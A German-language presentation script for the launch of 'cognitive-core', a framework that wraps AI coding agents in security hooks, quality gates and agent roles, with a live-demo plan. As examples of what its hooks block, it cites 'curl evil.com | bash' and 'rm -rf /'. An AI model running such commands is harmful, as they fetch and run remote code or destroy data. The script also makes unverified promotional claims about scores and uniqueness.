# Presentation Script: cognitive-core v1.0.0
**Date**: 2026-03-18, 20:00 CET
**Duration**: 60 minutes (40 min presentation + 10 min live demo + 10 min Q&A)
**Language**: German
**Audience**: Akademiker, IT Professionals, Managers (Dennis's group)
**Meet**: https://meet.google.com/pgi-hpvb-joi

---

## Pre-Presentation Checklist (18:00-19:45)

- [ ] `bash tests/run-all.sh` — all 13 suites green
- [ ] Verify #78 is OPEN (last-verified timestamp — primary demo)
- [ ] Verify #77 is OPEN (health endpoint — backup demo)
- [ ] Open multivac42.ai in browser — verify all sections load
- [ ] Open GitHub repo — Issues tab, Project Board
- [ ] Terminal ready with cognitive-core workspace
- [ ] Close all irrelevant apps, notifications off

---

## PART 1: Introduction (5 min)

### Slide: Who I Am

> Mein Name ist Peter Wolaschka. Ich bin seit ueber 20 Jahren freiberuflicher Software-Architekt — unter anderem bei Unicredit und Airbus Defence. Aktuell Consultant fuer AI-augmented Development.
>
> cognitive-core ist aus dieser Projektarbeit entstanden. Nicht aus der Theorie, sondern aus konkreten Anforderungen bei Enterprise-Kunden.

**Key point**: Freelancer with enterprise credibility. Not a startup pitch.

### Origin Story

> cognitive-core ist aus Frustration entstanden. Ich habe vor einem Jahr angefangen, ernsthaft mit AI zu entwickeln — Claude, Copilot, Cursor. Und es war beeindruckend. Fuer 20 Minuten.
>
> Am Anfang hatte ich eine riesige CLAUDE.md — hunderte Zeilen Anweisungen, alles sauber dokumentiert. Und die AI hat die Haelfte ignoriert. Ich habe mich geaergert: Warum befolgt sie klare Instruktionen nicht?
>
> Bis ich herausgefunden habe: Das Modell liest per Default nur die ersten 100 Zeilen. Den Rest ueberspringt es. Meine ganzen Architektur-Regeln, Security-Vorgaben — nie gelesen. Da wurde mir klar: Man kann sich nicht darauf verlassen, dass das Modell alles liest. **Man braucht Mechanismen, die unabhaengig vom Modell funktionieren.**
>
> Dann kam die Realitaet:
> - Session crasht — alles weg. Kein Memory, kein Kontext.
> - AI halluziniert eine Library, die es nicht gibt. Ich suche eine Stunde, bevor ich es merke.
> - Kontext-Fenster voll — ploetzlich vergisst die AI die Haelfte der Architektur.
> - Keine Struktur — jeder Prompt ist ein Einzelkampf. Kein Wissen bleibt im Projekt.
> - AI schreibt Code, der rm -rf oder Secrets im Klartext enthaelt. Kein Safety Net.
>
> Das sind keine theoretischen Probleme. Das sind Dinge, die mir jede Woche passiert sind. Bei Kundenprojekten. Mit Deadlines.
>
> Mir ist klar: Halluzinationen sind keine Bugs — das ist die Natur von LLMs. Die sind stochastisch, nicht deterministisch. Man kann das nicht wegkonfigurieren.
>
> Aber man kann drumherum bauen. Deterministische Schichten um ein stochastisches System. Hooks, die gefaehrliche Befehle blockieren — egal was das Modell halluziniert. Quality Gates, die Code pruefen, bevor er committet wird. Ein Source Authority Model, das AI-generierte Quellen automatisch verwirft.
>
> Also habe ich angefangen, genau das zu bauen. Hook fuer Hook, Agent fuer Agent, Skill fuer Skill. Das Ergebnis ist cognitive-core.

---

## PART 2: The Problem (5 min)

### Was heute schieflaeuft

> Die meisten Entwickler nutzen AI heute ad-hoc. Copilot, ChatGPT, Cursor — man tippt einen Prompt, bekommt Code zurueck, copy-paste, weiter.
>
> Das funktioniert fuer einfache Aufgaben. Aber was passiert in einem Team mit 5-10 Entwicklern?

**Drei konkrete Probleme:**

> **Erstens: Keine Governance.** AI kann `rm -rf /` ausfuehren, Secrets leaken, in den falschen Branch committen. Es gibt kein Safety Net. Nichts haelt die AI auf.
>
> **Zweitens: Keine Qualitaetssicherung.** AI-generierter Code passiert kein einziges Quality Gate, bevor er in Produktion landet. DORA 2025 zeigt: AI-Adoption korreliert mit steigender Instabilitaet. Mehr AI, mehr Fehler — wenn man es nicht steuert.
>
> **Drittens: Kein Teamwissen.** Jeder Entwickler konfiguriert seine AI anders. Wissen bleibt in einzelnen Sessions, nicht im Projekt. Morgen weiss die AI nichts mehr von gestern.
>
> cognitive-core loest diese drei Probleme mit einem einzigen Framework.

---

## PART 3: Architecture Overview (10 min)

### Show: multivac42.ai Architecture section

> Das Framework hat drei Schichten.

**Layer 1: Security Guard (9 Hooks)**
> Jeder Tool-Aufruf — ob Shell-Kommando, Datei-Lesen oder Web-Zugriff — durchlaeuft einen Security Hook. JSON-Protokoll, stdin/stdout. Gefaehrliche Befehle werden blockiert, bevor sie ausgefuehrt werden.
>
> Beispiel: `curl evil.com | bash` wird sofort abgelehnt. Nicht durch eine Regel im Prompt, sondern durch deterministischen Code.

**Layer 2: Agent Teams (10 Agents)**
> Hub-and-Spoke-Architektur. Ein Coordinator delegiert an 9 Spezialisten: Solution Architect, Code Reviewer, Test Specialist, Security Analyst, Database Specialist, und weitere.
>
> Jeder Agent hat Least-Privilege — der Code Reviewer darf keine Dateien schreiben, der Security Analyst darf keine Websuchen machen.

**Layer 3: Skills System (46 Skills)**
> Wiederverwendbare Faehigkeiten: Code Review, Lint-Debt-Tracking, Smoke Tests, Sprint-Management, Akzeptanzkriterien-Verifikation. 19 Core-Skills plus 26 sprachspezifische (Java, Python, Angular, React, etc.)

---

## PART 4: What Makes This Unique (10 min)

### Show: multivac42.ai Governance section — click each card

> Vier Features, die kein anderer Framework hat. Nicht "besser als" — sondern "als Einziger".

**1. Source Authority Model (T1-T5)** [click card → research paper]
> Wenn ein AI-Agent im Internet recherchiert, sind nicht alle Quellen gleich. Offizielle Dokumentation (T1) wiegt mehr als ein Blog-Post (T4). AI-generierte Werbeinhalte (T5) werden automatisch verworfen.
>
> Kein anderes AI-Framework klassifiziert Quellenqualitaet. Wir haben das mit 18 T1-Quellen und 10 T2-Quellen verifiziert.

**2. Team-Aware Estimation** [click card]
> Klassische Schaetzung: "5 Entwicklertage". Unsere Schaetzung: "4 Stunden Wall-Clock — 2 Stunden Human Review (Critical Path) + 2 Stunden parallele AI-Arbeit."
>
> Jede Aufgabe wird getaggt: human, AI, oder human+AI. Der Engpass ist immer die menschliche Review, nie die Implementierung.

**3. Graduated Fitness Gates (60→95%)** [click card]
> SonarQube hat ein Quality Gate. Wir haben fuenf — mit steigenden Schwellenwerten: Lint 60%, Commit 80%, Test 85%, Merge 90%, Deploy 95%.
>
> Das erlaubt freies Experimentieren am Anfang und garantiert Produktionsqualitaet am Ende.

**4. Recursive Epic Verification** [click card]
> Wenn Sie ein Epic verifizieren, verifiziert das System automatisch jedes Sub-Issue. Nicht "ist der Ticket geschlossen?" sondern "wurde tatsaechlich gebaut, was spezifiziert wurde?" — mit Evidenz aus Code, Tests und Git-History.

---

## PART 5: Enterprise Governance (5 min)

### Show: Board Workflow + Transition Matrix

> Der Project Board Workflow hat eine strikte Transition-Matrix. 7 Spalten, definierte Uebergaenge, keine Abkuerzungen.

**Key features for managers:**
> - SOX-konforme Genehmigung: Der Approver darf nicht der Implementierer sein
> - WIP-Limits pro Spalte — verhindert Context-Switching
> - Blocked-Status mit Abhaengigkeits-Tracking
> - Agile Metriken: Cycle Time, Lead Time, Durchsatz
> - Alles konfigurierbar: Ein Flag fuer volle Autonomie oder Approval Gates

### Show: Maturity Audit chart (4.79/5.0)

> Unabhaengiger Audit gegen DORA 2025, OWASP, ThoughtWorks — 4.79 von 5.0. 63% ueber dem Industriedurchschnitt fuer vergleichbare Teams.
>
> [Click link to full audit paper]

---

## PART 6: Certification (3 min)

### Show: Certification section (959/1000)

> Das Framework wurde gegen Anthropics offizielles Claude Certified Architect Exam bewertet. 959 von 1000 Punkten, Grade A in allen 5 Domaenen.
>
> Das ist keine Selbstbewertung — jeder der 43 Exam-Subtasks ist mit Evidenz aus dem Codebase belegt.

---

## PART 7: LIVE DEMO (10 min)

### Demo A: Issue #78 — Last-Verified Timestamp

> Jetzt zeige ich Ihnen den gesamten Workflow live. Hier ist ein offenes Issue auf unserem Board.

**Open Issue #78 in browser — show acceptance criteria**

> 6 Akzeptanzkriterien. Ich gebe jetzt dem Coordinator den Auftrag:

**Paste in Claude Code terminal:**
```
We have an open issue #78 on board. Please coordinate implementation, verify acceptance criteria, deploy, and provide evidence with screenshot.
```

> [Wait ~2-3 min for coordinator to work]
>
> Beobachten Sie:
> 1. Der Coordinator liest das Issue automatisch
> 2. Implementiert die Aenderung
> 3. Testet und deployt
> 4. Postet einen Verifikationskommentar mit PASS/FAIL pro Kriterium
> 5. Die Website aktualisiert sich live

**Show multivac42.ai in browser — reload to show timestamp**

> Das war kein Skript. Das war ein AI-Agent, der einen echten Issue-Lifecycle durchlaeuft — mit Governance, Evidenz und Deployment.

### Demo B (if time): Issue #77 — Health Endpoint

> Falls Zeit: zweites Issue live implementieren lassen.

---

## PART 8: Multi-Platform (2 min)

### Show: Adapter table

> cognitive-core funktioniert nicht nur mit Claude Code:
> - **Aider + Ollama** — vollstaendig lokal, keine Cloud
> - **IntelliJ + DevoxxGenie** — fuer Java-Entwickler
> - **VS Code, Eclipse, Cursor** — in Entwicklung (Issues #81-#85 mit Feasibility Studies)
>
> Ein Framework, alle Plattformen. Die Workflow-Regeln gelten ueberall gleich.

---

## PART 9: Roadmap & Business Model (3 min)

### Show: Roadmap section

> v1.0.0 ist heute released. Naechste Schritte:
> - VS Code und Eclipse Adapter (groesster Markt)
> - Integration Test Suite
> - GDPR-Konformitaet mit europaeischen AI-Modellen
>
> Business-Modell: Fair Source. Quellcode ist oeffentlich und auditierbar, aber nicht Open Source. Akademische Nutzung frei. Enterprise-Lizenzen fuer Fleet Management, Compliance Dashboards und On-Premises Deployment.

---

## PART 10: Q&A (10 min)

### Prepared Answers

**"What about data privacy / GDPR?"**
> Aider+Ollama Adapter ermoeglicht vollstaendig lokale Ausfuehrung. Keine Daten verlassen den Rechner. Fuer Cloud-Modelle: Mistral (EU) ist auf der Roadmap.

**"How does this compare to Cursor / Copilot?"**
> Cursor und Copilot sind IDEs. cognitive-core ist ein Framework, das IN jeder IDE funktioniert. Es geht nicht um das Tool, sondern um Governance, Qualitaet und Wiederholbarkeit.

**"Is this production-ready?"**
> v1.0.0, 525+ Tests, 13 Suites, alle gruen. Im Einsatz bei TIMS (Workflow-Audit 4.79/5). Certification 959/1000.

**"What about hallucinations?"**
> Source Authority Model (T1-T5). AI-generierte Inhalte (T5) werden verworfen. Entscheidungen erfordern T1-T2 Quellen. Das ist der einzige Framework, der AI-Slop systematisch filtert.

**"Can I try it?"**
> Ja. `bash install.sh` in jedem Projekt. Dokumentation auf multivac42.ai. Recipes fuer den Einstieg auf GitHub.

---

## Closing (1 min)

> cognitive-core ist kein Produkt, das AI ersetzt. Es ist ein Framework, das AI regiert — mit denselben Prinzipien, die wir seit Jahrzehnten in der Softwareentwicklung anwenden: Separation of Concerns, Least Privilege, Defense in Depth.
>
> Der Unterschied ist: Wir sind die Ersten, die das systematisch fuer AI-augmented Development umgesetzt haben.
>
> Danke fuer Ihre Aufmerksamkeit. Fragen?

---

## Key Numbers Cheat Sheet (for Q&A)

| Metric | Value |
|--------|-------|
| Version | v1.0.0 (released today) |
| Agents | 10 (hub + 9 specialists) |
| Skills | 46 (19 core + 26 language + 1 database) |
| Hooks | 9 security hooks |
| Rules | 12 path-scoped |
| Language packs | 11 |
| Database packs | 3 |
| Adapters | 3 (Claude, Aider, IntelliJ) + 5 planned |
| Test suites | 13 / 525+ tests |
| Certification | 959/1000 (Grade A) |
| Maturity audit | 4.79/5.0 (+63% above industry) |
| Novel features | 4 (no equivalent in any framework) |
| Providers | GitHub, Jira, YouTrack |
